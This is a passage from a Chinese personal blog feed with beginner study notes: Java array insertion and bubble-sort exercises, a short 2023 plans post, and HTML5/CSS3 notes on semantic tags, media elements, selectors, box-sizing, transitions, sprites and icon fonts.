乱序的数组，插入元素后将数组升序。</span></span><br><span class="line">        <span class="comment">// 据说冒泡排序似乎有些问题，这个以后再思考</span></span><br><span class="line">        <span class="comment">// 先实现这个方法</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个数组</span></span><br><span class="line">        <span class="type">int</span>[] new_arr = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length+<span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 遍历拷贝</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr.length ;i++ ) &#123;</span><br><span class="line">            new_arr[i]=arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 拷贝完成后，将arr扩容</span></span><br><span class="line">        arr = <span class="keyword">new</span> <span class="title class_">int</span>[new_arr.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr.length ;i++ ) &#123;</span><br><span class="line">            arr[i]=new_arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        new_arr = <span class="literal">null</span>;</span><br><span class="line">        arr[arr.length-<span class="number">1</span>] = num;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 冒泡排序</span></span><br><span class="line">        <span class="comment">// 整体上呈现的是最大长度-1的情况</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;arr.length-<span class="number">1</span> ;i++ ) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;arr.length-i+<span class="number">1</span> ;j++ ) &#123;</span><br><span class="line">                <span class="comment">// System.out.print(arr[j]+&quot; &quot;);</span></span><br><span class="line">                <span class="keyword">if</span> (arr[j]&lt;arr[j-<span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">numx</span> <span class="operator">=</span> arr[j];</span><br><span class="line">                    arr[j] = arr[j-<span class="number">1</span>];</span><br><span class="line">                    arr[j-<span class="number">1</span>] = numx;</span><br><span class="line">                    index = i;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> ix=<span class="number">0</span>;ix&lt;arr.length ;ix++ ) &#123;</span><br><span class="line">                System.out.print(arr[ix]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (index==-<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;-------&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我听完老师的解释后，有些被震撼到了。这就是……算法的魅力？</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">the_h01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 4.已知有个升序的数组，要求插入一个元素，</span></span><br><span class="line">        <span class="comment">// 该数组顺序依然是升序,比如:</span></span><br><span class="line">        <span class="comment">// [10，12，45，90]，添加23 后, 数组为 [10，12，23，45，90]</span></span><br><span class="line">        <span class="type">int</span>[] arr=&#123;<span class="number">10</span>,<span class="number">12</span>,<span class="number">45</span>,<span class="number">90</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">23</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 现在的思路：</span></span><br><span class="line">        <span class="comment">// 首先，确信一点：数组本身有序</span></span><br><span class="line">        <span class="comment">// 第二，新增元素需要有序的添加到列表当中</span></span><br><span class="line">        <span class="comment">// 如何有序添加进去？</span></span><br><span class="line">        <span class="comment">// 新增一个数组，数组的大小为(arr.length+1)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新建数组</span></span><br><span class="line">        <span class="type">int</span>[] new_arr = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length+<span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 存储对应下标</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 确定新增元素在arr的位置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr.length ;i++ ) &#123;</span><br><span class="line">            <span class="keyword">if</span> (num&lt;arr[i]) &#123;</span><br><span class="line">                index = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (index==-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">// 当确定其比较大小没有结果时</span></span><br><span class="line">            <span class="comment">// 确定其为新数组下标最大值值，</span></span><br><span class="line">            index=arr.length;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 取得确切下标后，将元素插入数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;new_arr.length ;i++ ) &#123;</span><br><span class="line">            <span class="comment">// 当找到指定下标时，使用new_arr[i]将新增的排列的元素加入数组。</span></span><br><span class="line">            <span class="keyword">if</span> (index!=i) &#123;</span><br><span class="line">                new_arr[i]=arr[j];</span><br><span class="line">                j++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                new_arr[i]=num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;new_arr.length ;i++ ) &#123;</span><br><span class="line">                System.out.print(new_arr[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="over.jpg" alt="&quot;结果集&quot;"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年计划与简介</title>
      <link href="/2023/02/11/the-2023/"/>
      <url>/2023/02/11/the-2023/</url>
      
        <content type="html"><![CDATA[<p>推荐查看日志的设备: <strong>PC端</strong></p><span id="more"></span><p>说实在，最难顶的是到现在都没整PHP那边的活计。</p><p>听说PHP在2-3线城市还能蹦跶，一线城市好像直接免谈喽。</p><p>2023的总体目标是攻克服务器后端搭建等技术，熟悉业务流程，当然，还有一个隐藏目标，这里就不透露了。</p><p>日志展示暂时未调整，以后再试试公布到其他站点上去。</p><p>本博客属于泛型博客，内容不限，主要源于自己学习的部分。属于所见所闻所学的日志分享。(具体变更请看另一篇置顶文章)</p><p>欢迎各位在此打卡留言哦~<br>本帖既是大致的规划贴，也是各位的打卡贴。ヽ(ˋ▽ˊ)ノ</p><p>当然，不会让你白点进来。下面是收罗过来的ChatGPT免注册网页版本：</p><p><a href="https://chat.forchange.cn/">“点我前往AI”</a></p><p>祝你玩AI玩的开心~</p><p><img src="ss1.jpg" alt="&quot;沙雕的AI 1&quot;"><br><img src="ss2.jpg" alt="&quot;沙雕的AI 2&quot;"><br><img src="ss3.jpg" alt="&quot;沙雕的AI 3&quot;"></p>]]></content>
      
      
      <categories>
          
          <category> 方向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端学习-css-03-高级</title>
      <link href="/2023/02/10/web-study-05/"/>
      <url>/2023/02/10/web-study-05/</url>
      
        <content type="html"><![CDATA[<p><strong>html5新特性</strong> (<span style="color:red"> <strong>全部带有兼容性问题</strong> </span>)</p><h1 id="新增语义化标签"><a href="#新增语义化标签" class="headerlink" title="新增语义化标签"></a>新增语义化标签</h1><p><strong>注意</strong> :</p><p>这种语义化标准主要是针对搜索引擎的</p><p>这些新标签页面中可以使用多次</p><p>在IE9中，需要把这些元素转换为块级元素</p><p>其实，我们移动端更喜欢使用这些标签</p><p>HTML5还增加了很多其他标签，暂时就不提那么多了。</p><span id="more"></span><p><strong>新增的头部、导航、定义块、侧边栏、尾部标签。</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">header</span> <span class="attr">class</span>=<span class="string">&quot;w&quot;</span>&gt;</span>头部标签<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box w&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line">        导航栏标签</span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">article</span>&gt;</span>内容标签<span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span>&gt;</span>定义文档某区域<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aside</span>&gt;</span>定义侧边栏标签<span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">&quot;w&quot;</span>&gt;</span></span><br><span class="line">    定义尾部标签</span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="新增多媒体标签"><a href="#新增多媒体标签" class="headerlink" title="新增多媒体标签"></a>新增多媒体标签</h1><h2 id="audio-音频"><a href="#audio-音频" class="headerlink" title="audio  音频"></a>audio  音频</h2><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>autoplay</td><td>autoplay</td><td>自动播放(谷歌禁用了)</td></tr><tr><td>controls</td><td>controls</td><td>播放的控件</td></tr><tr><td>loop</td><td>loop</td><td>是否循环播放</td></tr><tr><td>src</td><td>url</td><td>视频地址</td></tr></tbody></table><h1 id="video-视频"><a href="#video-视频" class="headerlink" title="video  视频"></a>video  视频</h1><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>autoplay</td><td>autoplay</td><td>自动播放(谷歌浏览器需要添加 muted=’muted’ 解决播放问题)</td></tr><tr><td>controls</td><td>controls</td><td>播放的按钮(控件)</td></tr><tr><td>width</td><td>像素</td><td>-</td></tr><tr><td>height</td><td>像素</td><td>-</td></tr><tr><td>loop</td><td>loop</td><td>是否循环播放</td></tr><tr><td>preload</td><td>auto</td><td>/none   预加载/不加载   有autoplay则忽略该属性</td></tr><tr><td>src</td><td>url</td><td>视频地址</td></tr><tr><td>poster</td><td>imgurl</td><td>加载等待的画面图片(加载视频的封面)</td></tr><tr><td>muted</td><td>muted</td><td>静音播放</td></tr></tbody></table><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">audio</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: aqua;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">video</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">muted</span>=<span class="string">&#x27;muted&#x27;</span> <span class="attr">loop</span>=<span class="string">&quot;loop&quot;</span> <span class="attr">poster</span>=<span class="string">&quot;video/cs-v-01.png&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;source&gt;标签的作用:检测浏览器支持的视频版本,适合哪个取哪个出来用,保证了低版本浏览器的兼容性 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;video/cs-v-01.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;video/cs-v-01.ogg&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/ogg&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 音频和视频一样,也有为了兼容性而产生的source写法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;music/Ikson-Paradise.mp3&quot;</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">autoplay</span>=<span class="string">&quot;autoplay&quot;</span>&gt;</span>音频<span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="新增的input类型-type"><a href="#新增的input类型-type" class="headerlink" title="新增的input类型(type)"></a>新增的input类型(type)</h1><table><thead><tr><th>属性值</th><th>说明</th></tr></thead><tbody><tr><td>email</td><td>邮箱类型</td></tr><tr><td>url</td><td>url类型</td></tr><tr><td>date</td><td>日期类型</td></tr><tr><td>time</td><td>时间类型</td></tr><tr><td>month</td><td>月类型</td></tr><tr><td>week</td><td>周类型</td></tr><tr><td>number</td><td>数字类型</td></tr><tr><td>tel</td><td>手机号码</td></tr><tr><td>search</td><td>搜索框</td></tr><tr><td>color</td><td>生成一个颜色表单</td></tr></tbody></table><h1 id="新增表单属性"><a href="#新增表单属性" class="headerlink" title="新增表单属性"></a>新增表单属性</h1><table><thead><tr><th>属性</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>required</td><td>required</td><td>表单拥有该属性表示其内容不能为空，必填<br>==&gt; 没填就没得交</td></tr><tr><td>placeholder</td><td>提示文</td><td>表单的提示信息，存在默认值将不显示  ★★<br>==&gt; 可以通过 input::placeholder {color:red;}修改这个属性的字体颜色(双伪类)</td></tr><tr><td>autofocus</td><td>autofocus</td><td>自动聚焦属性，页面加载完成自动聚焦到指定表单  ==&gt; 自动把你的光标定进去.</td></tr><tr><td>autocomplete</td><td>off / on</td><td>当用户在字段开始键入时，浏览器基于之前键入过的值，应该显示出在字段中填写的选项。<br>默认已经打开，如 autocomplete=”on”，关闭 autocomplete =”off”需要放在表单内，同时加上 name 属性，同时成功提交<br>==&gt;类似于你输入的历史记录,默认开启(不安全呐…)</td></tr><tr><td>multiple</td><td>multiple</td><td>可以多选文件提交 ★★</td></tr></tbody></table><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">            <span class="selector-tag">li</span> &#123;</span><br><span class="line">                <span class="attribute">list-style</span>: none;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">        &lt;<span class="selector-tag">form</span> action=&quot;&quot;&gt;</span><br><span class="line">            &lt;<span class="selector-tag">ul</span>&gt;</span><br><span class="line">                &lt;<span class="selector-tag">li</span>&gt;邮箱:&lt;input type=<span class="string">&quot;email&quot;</span> /&gt;&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;网址:&lt;input type=<span class="string">&quot;url&quot;</span> /&gt;&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;日期:&lt;input type=<span class="string">&quot;date&quot;</span> /&gt;&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;日期: &lt;input type=<span class="string">&quot;time&quot;</span> /&gt;&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;数量: &lt;input type=<span class="string">&quot;number&quot;</span> /&gt;&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;手机号码: &lt;input type=<span class="string">&quot;tel&quot;</span> /&gt;&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;搜索: &lt;input type=<span class="string">&quot;search&quot;</span> required=<span class="string">&quot;required&quot;</span> placeholder=<span class="string">&quot;请输入文本&quot;</span> autofocus=<span class="string">&quot;autofocus&quot;</span> /&gt;&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;提交多文件 &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;&quot;</span> id=<span class="string">&quot;&quot;</span> multiple=<span class="string">&quot;multiple&quot;</span>&gt;&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;颜色: &lt;input type=<span class="string">&quot;color&quot;</span> style=<span class="string">&quot;height: 60px;&quot;</span> /&gt;&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;特殊文本框选项: &lt;input type=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;请输入&quot;</span> style=<span class="string">&quot;height: 60px;&quot;</span>&gt;&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;&lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">        &lt;/form&gt;</span><br></pre></td></tr></table></figure><h1 id="以下是CSS3的新特性-i9的版本才支持"><a href="#以下是CSS3的新特性-i9的版本才支持" class="headerlink" title="以下是CSS3的新特性(i9的版本才支持)"></a>以下是CSS3的新特性(i9的版本才支持)</h1><p>移动端兼容较好。</p><h1 id="新增选择器"><a href="#新增选择器" class="headerlink" title="新增选择器"></a>新增选择器</h1><p><strong>属性选择器/结构伪类选择器/伪元素选择器</strong></p><h2 id="新增属性选择器"><a href="#新增属性选择器" class="headerlink" title="新增属性选择器"></a>新增属性选择器</h2><p>可以根据元素的特定属性选择元素 ==&gt; 可以到达不用借助类或id选择器</p><table><thead><tr><th>选择器写法</th><th>用法</th></tr></thead><tbody><tr><td>E[att]</td><td>选择具有att属性的E元素</td></tr><tr><td>E[att=”val”]</td><td>选择具有att属性等于val值★★★★</td></tr><tr><td>E[att^=”val”]</td><td>匹配具有att属性且值以val开头的E元素</td></tr><tr><td>E[att$=”val”]</td><td>匹配具有att属性且值以val结尾的E元素</td></tr><tr><td>E[att*=”val”]</td><td>匹配具有att属性且值含有val的E元素</td></tr></tbody></table><pre><code>==&gt; 注意!E是属性,方括号是选择器,都是要算权重的    注意:类选择器/属性选择器/伪类选择器  权重都是10</code></pre><h2 id="新增结构伪类选择器"><a href="#新增结构伪类选择器" class="headerlink" title="新增结构伪类选择器"></a>新增结构伪类选择器</h2><h3 id="全部标号的选择器"><a href="#全部标号的选择器" class="headerlink" title="全部标号的选择器"></a>全部标号的选择器</h3><table><thead><tr><th>选择器写法</th><th>用法</th></tr></thead><tbody><tr><td>E:first-child</td><td>匹配父元素中第一个子元素E</td></tr><tr><td>E:last-child</td><td>匹配父元素中最后一个E元素</td></tr><tr><td>E:nth-child(n)</td><td>匹配父元素中的第n个元素E</td></tr></tbody></table><pre><code>按所有的当前级标签取下标。n的写法 ==&gt; 数字/关键字(even&lt;偶数&gt;/odd&lt;奇数&gt;)/公式(从0开始进行每次+1计算,公式带n,)  =&gt; 只能使用+-和 &quot;数字n&quot; 的方式使用n进行选择下面是一些公式2n      偶数2n+1    奇数5n      5  10  15 ...n+5     从第5(含5)到最后-n+5    只选前5个有一点需要注意: 当父盒子下的子盒子包含不止一种类型的子盒子时,nth-child会给所有的盒子排序,也就是说,所有的盒子都占有序号!=== 执行的顺序:先看:nth-child()查序号,后看前面的标签是否合标准=== 把所有子盒子排列序号</code></pre><h3 id="按类型标号的选择器"><a href="#按类型标号的选择器" class="headerlink" title="按类型标号的选择器"></a>按类型标号的选择器</h3><table><thead><tr><th>选择器写法</th><th>用法</th></tr></thead><tbody><tr><td>E:first-of-type</td><td>指定类型E的第1个</td></tr><tr><td>E:last-of-type</td><td>指定类型E的最后个</td></tr><tr><td>E:nth-of-type(n)</td><td>指定类型E的第n个</td></tr><tr><td>E:nth-last-of-type(n)</td><td>指定类型E的倒数第n个</td></tr></tbody></table><pre><code>==&gt; 只会将指定子盒子排序，也就是按盒子类型取下标。==&gt; E:nth-last-of-type(n)和nth-child(n)差不多,只不过因为有last,是倒数的,举个例子:最后一个被n叫做1,倒数第二个为2...==&gt; 先匹配E,再匹配:nth-of-type()</code></pre><h2 id="新增伪元素选择器"><a href="#新增伪元素选择器" class="headerlink" title="新增伪元素选择器"></a>新增伪元素选择器</h2><p>创建新的标签，而非html本身已写入的标签，从而简化html结构</p><table><thead><tr><th>选择符</th><th>简介</th></tr></thead><tbody><tr><td>::before</td><td>在元素内部的前面插入内容</td></tr><tr><td>::after</td><td>在元素内部的后面插入内容</td></tr></tbody></table><p><strong>注意</strong> :</p><p>before 和 after 创建一个元素，但是属于行内元素</p><p>新创建的这个元素在文档树中是找不到的，所以我们称为伪元素</p><p><strong>语法</strong> :  </p><pre><code>element:before</code></pre><p>before和 after 必须有 content 属性</p><p>before在父元素内容的前面创建元素，after在父元素内容的后面插入元素</p><p>伪元素选择器和标签选择器一样，权重为1</p><h1 id="新增的盒子模型"><a href="#新增的盒子模型" class="headerlink" title="新增的盒子模型"></a>新增的盒子模型</h1><p><strong><code>box-sizing:content-box;</code></strong></p><table><thead><tr><th>属性值</th><th>说明</th></tr></thead><tbody><tr><td>content-box</td><td>是默认值，它表示元素的宽度和高度仅包括元素的内容，不包括内边距和边框。<br><strong>width+padding+border</strong> (以前默认的)</td></tr><tr><td>border-box</td><td>表示元素的宽度和高度包括元素的内容、内边距和边框。<br>(写多宽就多宽，不会被外边距和内边距挤到变形。)</td></tr></tbody></table><p>box-sizing:border-box;  ==&gt; 盒子大小为width</p><h1 id="CSS3其他特性-了解"><a href="#CSS3其他特性-了解" class="headerlink" title="CSS3其他特性(了解)"></a>CSS3其他特性(了解)</h1><h2 id="CSS滤镜filter"><a href="#CSS滤镜filter" class="headerlink" title="CSS滤镜filter"></a>CSS滤镜filter</h2><p>属性<code>filter:blur(1px);</code>   ==&gt; blur模糊处理函数,值越大越模糊(函数有很多个)</p><h2 id="CSS-calc函数"><a href="#CSS-calc函数" class="headerlink" title="CSS calc函数"></a>CSS calc函数</h2><p>属性<code>width:calc(100%-23px);</code>  ==&gt; 实现数值的计算求解(日常偷懒不用算数,嘻嘻)  ==&gt; 实现 + - * / 计算</p><h1 id="CSS-过渡-重点"><a href="#CSS-过渡-重点" class="headerlink" title="CSS 过渡 (重点)"></a>CSS 过渡 (重点)</h1><p>一个状态慢慢的过渡到另一个状态  ==&gt; 谁做变化给谁加</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">transition</span>: 要过渡的属性  花费的时间 运动曲线 何时开始;</span><br><span class="line"><span class="comment">/*  单个写法 */</span></span><br><span class="line"><span class="attribute">transition</span>: width <span class="number">0.5s</span> <span class="number">0.5s</span>;</span><br><span class="line"><span class="comment">/* 多个并列写法  */</span></span><br><span class="line"><span class="attribute">transition</span>: width <span class="number">0.5s</span> <span class="number">0.5s</span>,height <span class="number">0.5s</span> <span class="number">0.5s</span>; </span><br></pre></td></tr></table></figure><table><thead><tr><th>属性值</th><th>说明</th></tr></thead><tbody><tr><td>过渡的属性:</td><td>可以指定全部属性&gt;&gt;all，也可以特指某个属性</td></tr><tr><td>时间</td><td>单位s(必须单位)</td></tr><tr><td>运动曲线:</td><td>默认ease(逐渐慢下来)  linear匀速 ease-in 加速 ease-out减速 ease-in-out 先加速后减速</td></tr><tr><td>何时开始:</td><td>单位时s(触发的延迟时间,也就是什么时候开始)</td></tr></tbody></table><p>其实后面应该还有个移动端的，但实在是没时间学，先放掉了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> html </tag>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端学习-css-02-高级</title>
      <link href="/2023/02/10/web-study-04/"/>
      <url>/2023/02/10/web-study-04/</url>
      
        <content type="html"><![CDATA[<h1 id="精灵图"><a href="#精灵图" class="headerlink" title="精灵图"></a>精灵图</h1><p><img src="web-s00.jpg" alt="&quot;精灵图&quot;"></p><blockquote><ol><li><p><strong>目的</strong> :减少接收发送请求的次数(指数据的收发)</p></li><li><p><strong>使用核心</strong> :</p></li></ol></blockquote><span id="more"></span><pre><code>(1) 小背景集合到大图片当中(2) 大图片称为sprites(精灵图/雪碧图)(3) 涉及:background-position  ==&gt; 右下为正,左上为负(也就是说，通过背景图定位来控制小部件的背景图位置)(4) 精确测量每个小背景图片的大小和位置  ==&gt; 工具:FW,PS等</code></pre><h1 id="字体小图标"><a href="#字体小图标" class="headerlink" title="字体小图标"></a>字体小图标</h1><p><img src="web-s01.jpg" alt="&quot;字体小图标&quot;"></p><blockquote><ol><li><strong>说明</strong> :字体图标可以为前端工程师提供一种方便高效的图标使用方式，展示的是图标，本质属于字体.</li></ol><p>2.css格式:下面再补充</p><p>3.优点:</p><blockquote><p><strong>轻量级</strong> :一个图标字体要比一系列的图像要小。一旦字体加载了，图标就会马上渲染出来，减少了服务器请求</p><p><strong>灵活性</strong> :本质其实是文字，可以很随意的改变颜色、产生阴影、诱明效果、旋转等</p><p><strong>兼容性</strong> :几乎支持所有的浏览器，可以放心使用<br><strong>注意</strong> :字体图标 <strong>不能替代</strong> 精灵技术，只是对工作中图标 <strong>部分技术</strong> 的提升和优化</p></blockquote><p>4.总结:</p><blockquote><p>结构样式 <strong>复杂</strong> =&gt; 精灵图</p><p>结构样式 <strong>简单</strong> =&gt; 字体图标</p></blockquote><p>5.下载字体图标库站点:</p><blockquote><p><a href="http://icomoon.io/">http://icomoon.io</a></p><p><a href="http://www.iconfont.cn/">http://www.iconfont.cn/</a> ==&gt;阿里巴巴的矢量图标库</p></blockquote><p>6.使用方法:</p><blockquote><p>iconmoon app ==&gt;</p><blockquote><p>在网站选定图标,点击下面三列菜单的最右列下载,跳转到带有小方块的页面,先不要退出</p><p>打开下载完成的压缩包文件,将fonts文件夹放到网页根目录下</p><p>打开压缩包内的.css文件,将第一个大括号在内的内容声明拷贝到网页(带着@的那个)</p><p>在网页文件内需要使用时,将声明当中的”font-family: ‘icomoon’;”放到对应的盒子当中</p><p>最后,把资源网页需要的图标旁边对应的方块图标复制下来,放到自己的网页上去就行了.(当然,也可以打开demo.html) ==&gt;虽然看起来方块是一样的,实际上内容完全不同,使用的时候得注意.</p></blockquote></blockquote><p>7.追加的新图标的办法:</p><blockquote><p>点击网站左上角“Import Icons”打开json文件导入,点击下面更多的图标进行图标追加,最后再次点击“Generate Font F”进行下载更新,替换源文件即可.</p></blockquote></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 字体声明 */</span></span><br><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&#x27;icomoon&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;fonts/icomoon.eot?tw9m0x&#x27;</span>);</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;fonts/icomoon.eot?tw9m0x#iefix&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;embedded-opentype&#x27;</span>),</span><br><span class="line">    <span class="built_in">url</span>(<span class="string">&#x27;fonts/icomoon.ttf?tw9m0x&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;truetype&#x27;</span>),</span><br><span class="line">    <span class="built_in">url</span>(<span class="string">&#x27;fonts/icomoon.woff?tw9m0x&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;woff&#x27;</span>),</span><br><span class="line">    <span class="built_in">url</span>(<span class="string">&#x27;fonts/icomoon.svg?tw9m0x#icomoon&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;svg&#x27;</span>);</span><br><span class="line">    <span class="attribute">font-weight</span>: normal;</span><br><span class="line">    <span class="attribute">font-style</span>: normal;</span><br><span class="line">    <span class="attribute">font-display</span>: block;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="comment">/* 调用的方式 */</span></span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&#x27;icomoon&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CSS三角做法"><a href="#CSS三角做法" class="headerlink" title="CSS三角做法"></a>CSS三角做法</h1><p>css做三角的思维其实非常简单，只需要内边距+内容部分为0时，盒子就只剩下边框了。剩下的边框就如下图那样，稍作调整就能整除个独立的三角形。</p><p><img src="web-s02.jpg" alt="&quot;正方形&quot;"></p><p>集合好下面的css，赋值给一个类或者id，放到网页就能显示出来了。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 当盒子没宽高后,就剩下边框了. */</span></span><br><span class="line"><span class="comment">/* 边框只给一角,就算是三角形了 */</span></span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span 